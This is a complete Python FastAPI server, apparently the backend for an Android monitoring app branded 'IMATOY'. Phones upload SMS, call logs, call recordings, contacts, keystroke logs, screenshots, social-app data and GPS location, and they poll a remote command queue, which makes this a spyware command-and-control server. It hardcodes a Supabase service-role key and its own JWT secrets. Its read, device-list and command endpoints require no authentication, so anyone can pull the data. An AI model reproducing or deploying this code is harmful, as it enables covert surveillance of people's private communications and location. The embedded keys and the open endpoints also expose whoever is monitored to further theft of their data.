#!/usr/bin/env python3
"""
IMATOY Backend Server — Python/FastAPI + Supabase
Render.com pe host karo — single file, sab kuch isme hai
Database: Supabase (PostgreSQL) — tables already bani hain
Realtime: Supabase Realtime (Flutter app directly connect karta hai)

Deploy on Render.com:
  Build Command: pip install -r requirements.txt
  Start Command: python server.py
  Environment Variables: (neeche dekho)
"""

import os, uuid, json, base64, asyncio
from datetime import datetime, timedelta
from typing import Optional, List, Any
from pathlib import Path

import uvicorn
import httpx
from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File, Form, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from jose import jwt, JWTError

# ═══════════════════════════════════════════════════════════════════
# CONFIG — Render.com pe Environment Variables set karo
# ═══════════════════════════════════════════════════════════════════
SUPABASE_URL      = os.getenv("SUPABASE_URL",      "https://owfiiqyimnxalgissulj.supabase.co")
SUPABASE_KEY      = os.getenv("SUPABASE_KEY",      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93ZmlpcXlpbW54YWxnaXNzdWxqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MjUzNjU5MywiZXhwIjoyMDg4MTEyNTkzfQ.WCOG2gE5AJXeS4pvUrbOd63t9GKyh8K-swHUe4WxBQY")
JWT_SECRET        = os.getenv("JWT_SECRET",        "imatoy_super_secret_jwt_key_2024_xK9mP3nQ7rL2vB8")
AUTO_REGISTER_KEY = os.getenv("AUTO_REGISTER_KEY", "imatoy_auto_register_secret_2024")
JWT_EXPIRE_DAYS   = int(os.getenv("JWT_EXPIRE_DAYS", "30"))
PORT              = int(os.getenv("PORT", "10000"))
UPLOAD_DIR        = os.getenv("UPLOAD_DIR", "/tmp/imatoy_uploads")
ALGORITHM         = "HS256"

# Upload directories
for d in ["media", "screenshots", "audio", "recordings"]:
    Path(f"{UPLOAD_DIR}/{d}").mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════
# SUPABASE REST API HELPERS
# ═══════════════════════════════════════════════════════════════════
SB_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=representation",
}

async def sb_get(table: str, params: dict = {}) -> list:
    """Supabase se data fetch karo"""
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, params=params, timeout=15
        )
        data = r.json()
        return data if isinstance(data, list) else []

async def sb_get_one(table: str, params: dict = {}) -> Optional[dict]:
    """Supabase se ek record fetch karo"""
    params["limit"] = 1
    rows = await sb_get(table, params)
    return rows[0] if rows else None

async def sb_insert(table: str, data: dict) -> Optional[dict]:
    """Supabase mein insert karo"""
    async with httpx.AsyncClient() as client:
        r = await client.post(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, json=data, timeout=15
        )
        result = r.json()
        if isinstance(result, list) and result:
            return result[0]
        return data

async def sb_update(table: str, match: dict, data: dict) -> None:
    """Supabase mein update karo"""
    params = {k: f"eq.{v}" for k, v in match.items()}
    async with httpx.AsyncClient() as client:
        await client.patch(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers=SB_HEADERS, params=params, json=data, timeout=15
        )

async def sb_count(table: str, params: dict = {}) -> int:
    """Supabase mein count karo"""
    p = {**params, "select": "count()"}
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{SUPABASE_URL}/rest/v1/{table}",
            headers={**SB_HEADERS, "Prefer": "count=exact"},
            params=p, timeout=15
        )
        try:
            data = r.json()
            if isinstance(data, list) and data:
                return int(data[0].get("count", 0))
            # Try content-range header
            cr = r.headers.get("content-range", "0/0")
            return int(cr.split("/")[-1]) if "/" in cr else 0
        except:
            return 0

# ═══════════════════════════════════════════════════════════════════
# JWT HELPERS
# ═══════════════════════════════════════════════════════════════════
def create_jwt(payload: dict, expire_days: int = JWT_EXPIRE_DAYS) -> str:
    data = payload.copy()
    data["exp"] = datetime.utcnow() + timedelta(days=expire_days)
    data["iat"] = datetime.utcnow()
    return jwt.encode(data, JWT_SECRET, algorithm=ALGORITHM)

def verify_jwt(token: str) -> Optional[dict]:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[ALGORITHM])
    except JWTError:
        return None

async def get_device_id(authorization: str = Header(None)) -> str:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Unauthorized")
    payload = verify_jwt(authorization[7:])
    if not payload or "deviceId" not in payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    return payload["deviceId"]

# ═══════════════════════════════════════════════════════════════════
# FASTAPI APP
# ═══════════════════════════════════════════════════════════════════
app = FastAPI(title="IMATOY Backend", version="2.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def ok(data=None, **kwargs):
    return {"success": True, **({"data": data} if data is not None else {}), **kwargs}

def err(msg: str, code: int = 400):
    raise HTTPException(status_code=code, detail={"success": False, "message": msg})

def now_iso() -> str:
    return datetime.utcnow().isoformat()

def make_id() -> str:
    return str(uuid.uuid4())

# ═══════════════════════════════════════════════════════════════════
# PYDANTIC MODELS
# ═══════════════════════════════════════════════════════════════════
class AutoRegisterBody(BaseModel):
    deviceInfo: Optional[dict] = {}
    deviceId: Optional[str] = None
    deviceName: Optional[str] = None
    model: Optional[str] = None
    manufacturer: Optional[str] = None
    androidVersion: Optional[str] = None
    appVersion: Optional[str] = None

class RefreshTokenBody(BaseModel):
    refreshToken: str

class SmsBody(BaseModel):
    smsList: Optional[List[dict]] = None
    childId: Optional[str] = None

class CallBody(BaseModel):
    callList: Optional[List[dict]] = None
    childId: Optional[str] = None

class ContactBody(BaseModel):
    contacts: Optional[List[dict]] = None
    childId: Optional[str] = None

class KeylogBody(BaseModel):
    logs: Optional[List[dict]] = None
    childId: Optional[str] = None

class SocialBody(BaseModel):
    appPackage: Optional[str] = None
    appName: Optional[str] = None
    childId: Optional[str] = None

class DeviceInfoBody(BaseModel):
    batteryLevel: Optional[int] = None
    isCharging: Optional[bool] = None
    wifiSsid: Optional[str] = None
    ipAddress: Optional[str] = None
    locationLat: Optional[float] = None
    locationLng: Optional[float] = None

class CommandBody(BaseModel):
    deviceId: str
    command: str
    params: Optional[dict] = {}

class CommandResultBody(BaseModel):
    result: Any = None

class ScreenUploadBody(BaseModel):
    data: str  # base64
    deviceId: Optional[str] = None

class MediaBase64Body(BaseModel):
    data: str  # base64
    fileName: Optional[str] = "file.jpg"
    fileType: Optional[str] = "image/jpeg"

# ═══════════════════════════════════════════════════════════════════
# ROUTES: Health
# ═══════════════════════════════════════════════════════════════════
@app.get("/")
@app.get("/health")
@app.get("/api/health")
async def health():
    cnt = await sb_count("devices")
    return ok(message="🧸 IMATOY Python Backend Running",
              version="2.0.0", db="supabase",
              timestamp=now_iso(), registered_devices=cnt)

# ═══════════════════════════════════════════════════════════════════
# ROUTES: AUTH
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/auth/auto-register")
async def auto_register(body: AutoRegisterBody, request: Request):
    key = request.headers.get("x-auto-register-key", "")
    if key != AUTO_REGISTER_KEY:
        err("Invalid auto-register key", 403)

    info = body.deviceInfo or {}
    device_id    = info.get("deviceId")    or body.deviceId    or make_id()
    device_name  = info.get("deviceName")  or body.deviceName  or "Unknown Device"
    model        = info.get("model") or info.get("deviceModel") or body.model or "Unknown"
    manufacturer = info.get("manufacturer") or body.manufacturer or "Unknown"
    android_ver  = info.get("androidVersion") or body.androidVersion or "Unknown"
    app_version  = info.get("appVersion")  or body.appVersion  or "1.0.0"

    existing = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if existing:
        token   = create_jwt({"deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})
        refresh = create_jwt({"deviceId": device_id, "type": "refresh"}, 90)
        await sb_update("devices", {"device_id": device_id}, {
            "last_seen": now_iso(), "token": token,
            "device_name": device_name, "model": model,
            "android_version": android_ver, "app_version": app_version
        })
        return ok(message="Device re-registered", data={
            "token": token, "refreshToken": refresh,
            "deviceId": device_id, "parentId": existing["parent_id"],
            "childId": existing["child_id"], "expiresIn": f"{JWT_EXPIRE_DAYS}d"
        })

    parent_id = make_id()
    child_id  = make_id()
    token     = create_jwt({"deviceId": device_id, "childId": child_id, "parentId": parent_id})
    refresh   = create_jwt({"deviceId": device_id, "type": "refresh"}, 90)

    await sb_insert("devices", {
        "id": make_id(), "device_id": device_id, "device_name": device_name,
        "model": model, "manufacturer": manufacturer, "android_version": android_ver,
        "app_version": app_version, "parent_id": parent_id, "child_id": child_id,
        "token": token, "is_active": True, "last_seen": now_iso(), "created_at": now_iso()
    })
    return ok(message="Device registered successfully", data={
        "token": token, "refreshToken": refresh,
        "deviceId": device_id, "parentId": parent_id,
        "childId": child_id, "expiresIn": f"{JWT_EXPIRE_DAYS}d"
    })

@app.post("/api/auth/pair-device")
async def pair_device(body: AutoRegisterBody):
    info = body.deviceInfo or {}
    device_id   = info.get("deviceId")   or make_id()
    device_name = info.get("deviceName") or "Unknown"
    model       = info.get("deviceModel") or info.get("model") or "Unknown"
    android_ver = info.get("androidVersion") or "Unknown"

    existing = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if existing:
        token = create_jwt({"deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})
        await sb_update("devices", {"device_id": device_id}, {"last_seen": now_iso(), "token": token})
        return ok(data={"token": token, "deviceId": device_id, "childId": existing["child_id"], "parentId": existing["parent_id"]})

    parent_id = make_id(); child_id = make_id()
    token = create_jwt({"deviceId": device_id, "childId": child_id, "parentId": parent_id})
    await sb_insert("devices", {
        "id": make_id(), "device_id": device_id, "device_name": device_name,
        "model": model, "android_version": android_ver, "parent_id": parent_id,
        "child_id": child_id, "token": token, "is_active": True,
        "last_seen": now_iso(), "created_at": now_iso()
    })
    return ok(data={"token": token, "deviceId": device_id, "childId": child_id, "parentId": parent_id})

@app.post("/api/auth/refresh-token")
async def refresh_token(body: RefreshTokenBody):
    payload = verify_jwt(body.refreshToken)
    if not payload or "deviceId" not in payload:
        err("Invalid refresh token", 401)
    device = await sb_get_one("devices", {"device_id": f"eq.{payload['deviceId']}"})
    if not device:
        err("Device not found", 404)
    new_token = create_jwt({"deviceId": payload["deviceId"], "childId": device["child_id"], "parentId": device["parent_id"]})
    await sb_update("devices", {"device_id": payload["deviceId"]}, {"token": new_token, "last_seen": now_iso()})
    return ok(token=new_token, expiresIn=f"{JWT_EXPIRE_DAYS}d")

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SMS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/sms")
@app.post("/api/sms/sync")
async def upload_sms(body: SmsBody, device_id: str = Depends(get_device_id)):
    logs = body.smsList or []
    saved = 0
    for log in logs:
        if not log: continue
        await sb_insert("sms_logs", {
            "id": make_id(), "device_id": device_id,
            "address": log.get("address"), "body": log.get("body"),
            "type": log.get("type"), "date": log.get("date"),
            "thread_id": log.get("threadId"), "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/sms/{device_id}")
async def get_sms(device_id: str, limit: int = 100):
    rows = await sb_get("sms_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: CALLS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/calls")
@app.post("/api/calls/sync")
async def upload_calls(body: CallBody, device_id: str = Depends(get_device_id)):
    logs = body.callList or []
    saved = 0
    for log in logs:
        if not log: continue
        await sb_insert("call_logs", {
            "id": make_id(), "device_id": device_id,
            "number": log.get("number"), "name": log.get("name"),
            "type": log.get("type"), "duration": int(log.get("duration", 0)),
            "date": log.get("date"), "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.post("/api/calls/recording/upload")
async def upload_recording(
    recording: UploadFile = File(...),
    phoneNumber: str = Form("unknown"),
    duration: int = Form(0),
    device_id: str = Depends(get_device_id)
):
    fid = make_id()
    ext = recording.filename.rsplit(".", 1)[-1] if "." in recording.filename else "mp3"
    fname = f"rec_{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/audio/{fname}"
    content = await recording.read()
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/audio/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": fname,
        "file_path": fpath, "file_url": furl, "file_type": f"audio/{ext}",
        "file_size": len(content), "category": "recording", "created_at": now_iso()
    })
    await sb_insert("call_logs", {
        "id": make_id(), "device_id": device_id, "number": phoneNumber,
        "type": "recording", "duration": duration, "date": now_iso(), "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.get("/api/calls/{device_id}")
async def get_calls(device_id: str, limit: int = 100):
    rows = await sb_get("call_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: CONTACTS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/contacts")
@app.post("/api/contacts/sync")
async def upload_contacts(body: ContactBody, device_id: str = Depends(get_device_id)):
    contacts = body.contacts or []
    saved = 0
    for c in contacts:
        if not c: continue
        phones = json.dumps(c.get("phones", [])) if isinstance(c.get("phones"), list) else (c.get("phones") or "[]")
        emails = json.dumps(c.get("emails", [])) if isinstance(c.get("emails"), list) else (c.get("emails") or "[]")
        await sb_insert("contacts", {
            "id": make_id(), "device_id": device_id,
            "name": c.get("name"), "phones": phones,
            "emails": emails, "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/contacts/{device_id}")
async def get_contacts(device_id: str, limit: int = 500):
    rows = await sb_get("contacts", {
        "device_id": f"eq.{device_id}",
        "order": "name.asc",
        "limit": min(limit, 5000)
    })
    for r in rows:
        try: r["phones"] = json.loads(r.get("phones") or "[]")
        except: pass
        try: r["emails"] = json.loads(r.get("emails") or "[]")
        except: pass
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: MEDIA
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/media/base64")
async def upload_media_base64(body: MediaBase64Body, device_id: str = Depends(get_device_id)):
    content = base64.b64decode(body.data)
    fid = make_id()
    ext = body.fileName.rsplit(".", 1)[-1] if "." in body.fileName else "jpg"
    fname = f"{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/media/{fname}"
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/media/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": body.fileName,
        "file_path": fpath, "file_url": furl, "file_type": body.fileType,
        "file_size": len(content), "category": "media", "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.post("/api/media")
@app.post("/api/media/upload")
async def upload_media(
    file: UploadFile = File(None),
    media: UploadFile = File(None),
    fileType: str = Form("media"),
    device_id: str = Depends(get_device_id)
):
    upload = file or media
    if not upload:
        err("No file uploaded")
    fid = make_id()
    ext = upload.filename.rsplit(".", 1)[-1] if "." in upload.filename else "bin"
    subdir = "screenshots" if fileType in ["screenshot", "screenshots"] else ("audio" if fileType == "audio" else "media")
    fname = f"{fid}.{ext}"
    fpath = f"{UPLOAD_DIR}/{subdir}/{fname}"
    content = await upload.read()
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/{subdir}/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": upload.filename,
        "file_path": fpath, "file_url": furl, "file_type": upload.content_type or "application/octet-stream",
        "file_size": len(content), "category": subdir, "created_at": now_iso()
    })
    return ok(fileId=fid, fileName=fname, url=furl)

@app.get("/api/media/{device_id}")
async def get_media(device_id: str, limit: int = 50):
    rows = await sb_get("media_files", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 500)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: KEYLOG
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/keylog")
@app.post("/api/keylog/sync")
async def upload_keylog(body: KeylogBody, device_id: str = Depends(get_device_id)):
    entries = body.logs or []
    saved = 0
    for e in entries:
        if not e: continue
        await sb_insert("keylog_entries", {
            "id": make_id(), "device_id": device_id,
            "app_package": e.get("appPackage"), "app_name": e.get("appName"),
            "text": e.get("text"), "timestamp": e.get("timestamp"),
            "created_at": now_iso()
        })
        saved += 1
    return ok(saved=saved)

@app.get("/api/keylog/{device_id}")
async def get_keylog(device_id: str, limit: int = 200):
    rows = await sb_get("keylog_entries", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 2000)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SOCIAL
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/social")
@app.post("/api/social/sync")
async def upload_social(body: SocialBody, request: Request, device_id: str = Depends(get_device_id)):
    raw = await request.json()
    await sb_insert("social_logs", {
        "id": make_id(), "device_id": device_id,
        "app_package": body.appPackage, "app_name": body.appName,
        "data": json.dumps(raw), "created_at": now_iso()
    })
    return ok()

@app.get("/api/social/{device_id}")
async def get_social(device_id: str, limit: int = 100):
    rows = await sb_get("social_logs", {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 1000)
    })
    for r in rows:
        try: r["data"] = json.loads(r.get("data") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: DEVICE
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/device/heartbeat")
async def heartbeat(body: DeviceInfoBody, device_id: str = Depends(get_device_id)):
    await sb_update("devices", {"device_id": device_id}, {"last_seen": now_iso()})
    await sb_insert("device_info", {
        "id": make_id(), "device_id": device_id,
        "battery_level": body.batteryLevel, "is_charging": body.isCharging,
        "wifi_ssid": body.wifiSsid, "ip_address": body.ipAddress,
        "location_lat": body.locationLat, "location_lng": body.locationLng,
        "created_at": now_iso()
    })
    return ok()

@app.get("/api/device/list")
async def list_devices():
    rows = await sb_get("devices", {"order": "last_seen.desc", "limit": 200})
    return ok(data=rows, count=len(rows))

@app.put("/api/device/{child_id}/info")
async def update_device_info(child_id: str, body: DeviceInfoBody, device_id: str = Depends(get_device_id)):
    await sb_update("devices", {"device_id": child_id}, {"last_seen": now_iso()})
    await sb_insert("device_info", {
        "id": make_id(), "device_id": device_id,
        "battery_level": body.batteryLevel, "is_charging": body.isCharging,
        "wifi_ssid": body.wifiSsid, "ip_address": body.ipAddress,
        "location_lat": body.locationLat, "location_lng": body.locationLng,
        "created_at": now_iso()
    })
    return ok()

@app.get("/api/device/{device_id}")
async def get_device(device_id: str):
    dev = await sb_get_one("devices", {"device_id": f"eq.{device_id}"})
    if not dev:
        dev = await sb_get_one("devices", {"child_id": f"eq.{device_id}"})
    if not dev:
        raise HTTPException(status_code=404, detail={"success": False, "message": "Device not found"})
    info = await sb_get_one("device_info", {"device_id": f"eq.{dev.get('device_id', device_id)}"})
    if info:
        dev["latest_info"] = info
    return ok(data=dev)

# ═══════════════════════════════════════════════════════════════════
# ROUTES: COMMANDS
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/commands")
async def create_command(body: CommandBody):
    cid = make_id()
    await sb_insert("commands", {
        "id": cid, "device_id": body.deviceId, "command": body.command,
        "params": json.dumps(body.params or {}), "status": "pending",
        "created_at": now_iso()
    })
    return ok(commandId=cid, status="pending", message="Command queued")

@app.get("/api/commands/{device_id}/pending")
async def get_pending_commands(device_id: str):
    rows = await sb_get("commands", {
        "device_id": f"eq.{device_id}",
        "status": "eq.pending",
        "order": "created_at.asc",
        "limit": 20
    })
    for r in rows:
        try: r["params"] = json.loads(r.get("params") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

@app.put("/api/commands/{command_id}/result")
async def update_command_result(command_id: str, body: CommandResultBody):
    await sb_update("commands", {"id": command_id}, {
        "status": "completed",
        "result": json.dumps(body.result),
        "executed_at": now_iso()
    })
    return ok()

@app.get("/api/commands/{device_id}")
async def get_commands(device_id: str, status: str = None, limit: int = 50):
    params = {
        "device_id": f"eq.{device_id}",
        "order": "created_at.desc",
        "limit": min(limit, 200)
    }
    if status:
        params["status"] = f"eq.{status}"
    rows = await sb_get("commands", params)
    for r in rows:
        try: r["params"] = json.loads(r.get("params") or "{}")
        except: pass
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: SCREEN UPLOAD
# ═══════════════════════════════════════════════════════════════════
@app.post("/api/screen/upload")
async def upload_screenshot(body: ScreenUploadBody, device_id: str = Depends(get_device_id)):
    if not body.data:
        err("No screenshot data")
    content = base64.b64decode(body.data)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fid = make_id()
    fname = f"screen_{device_id[:8]}_{ts}.jpg"
    fpath = f"{UPLOAD_DIR}/screenshots/{fname}"
    with open(fpath, "wb") as f:
        f.write(content)
    furl = f"/uploads/screenshots/{fname}"
    await sb_insert("media_files", {
        "id": fid, "device_id": device_id, "file_name": fname,
        "file_path": fpath, "file_url": furl, "file_type": "image/jpeg",
        "file_size": len(content), "category": "screenshot", "created_at": now_iso()
    })
    return ok(fileName=fname, url=furl, fileId=fid)

@app.get("/api/screen/{device_id}")
async def get_screenshots(device_id: str, limit: int = 20):
    rows = await sb_get("media_files", {
        "device_id": f"eq.{device_id}",
        "category": "eq.screenshot",
        "order": "created_at.desc",
        "limit": min(limit, 100)
    })
    return ok(data=rows, count=len(rows))

# ═══════════════════════════════════════════════════════════════════
# ROUTES: STATS
# ═══════════════════════════════════════════════════════════════════
@app.get("/api/stats/{device_id}")
async def get_stats(device_id: str):
    dev  = await sb_get_one("devices",     {"device_id": f"eq.{device_id}"})
    if not dev:
        dev = await sb_get_one("devices",  {"child_id":  f"eq.{device_id}"})
    info = await sb_get_one("device_info", {"device_id": f"eq.{device_id}"})

    sms_count     = await sb_count("sms_logs",      {"device_id": f"eq.{device_id}"})
    call_count    = await sb_count("call_logs",      {"device_id": f"eq.{device_id}"})
    contact_count = await sb_count("contacts",       {"device_id": f"eq.{device_id}"})
    media_count   = await sb_count("media_files",    {"device_id": f"eq.{device_id}"})
    keylog_count  = await sb_count("keylog_entries", {"device_id": f"eq.{device_id}"})
    social_count  = await sb_count("social_logs",    {"device_id": f"eq.{device_id}"})

    return ok(data={
        "deviceId":       device_id,
        "deviceName":     dev.get("device_name", "Unknown") if dev else "Unknown",
        "model":          dev.get("model")           if dev else None,
        "androidVersion": dev.get("android_version") if dev else None,
        "lastSeen":       dev.get("last_seen")        if dev else None,
        "isActive":       bool(dev.get("is_active"))  if dev else False,
        "smsCount":       sms_count,
        "callCount":      call_count,
        "contactCount":   contact_count,
        "mediaCount":     media_count,
        "keylogCount":    keylog_count,
        "socialCount":    social_count,
        "battery":        info.get("battery_level") if info else None,
        "isCharging":     info.get("is_charging")   if info else None,
        "wifiSsid":       info.get("wifi_ssid")     if info else None,
        "ipAddress":      info.get("ip_address")    if info else None,
        "location":       {"lat": info["location_lat"], "lng": info["location_lng"]}
                          if info and info.get("location_lat") else None,
    })

# ═══════════════════════════════════════════════════════════════════
# SERVE UPLOADED FILES
# ═══════════════════════════════════════════════════════════════════
@app.get("/uploads/{category}/{filename}")
async def serve_file(category: str, filename: str):
    allowed = ["media", "screenshots", "audio", "recordings"]
    if category not in allowed:
        raise HTTPException(status_code=400, detail="Invalid category")
    fpath = f"{UPLOAD_DIR}/{category}/{filename}"
    if not os.path.exists(fpath):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(fpath)

# ═══════════════════════════════════════════════════════════════════
# EXCEPTION HANDLERS
# ═══════════════════════════════════════════════════════════════════
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    detail = exc.detail
    if isinstance(detail, dict):
        return JSONResponse(status_code=exc.status_code, content=detail)
    return JSONResponse(status_code=exc.status_code, content={"success": False, "message": str(detail)})

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    return JSONResponse(status_code=500, content={"success": False, "message": str(exc)})

# ═══════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import sys
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    print("=" * 55)
    print("  IMATOY Backend Server (Python/FastAPI + Supabase)")
    print(f"  Port    : {PORT}")
    print(f"  Supabase: {SUPABASE_URL}")
    print("=" * 55)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
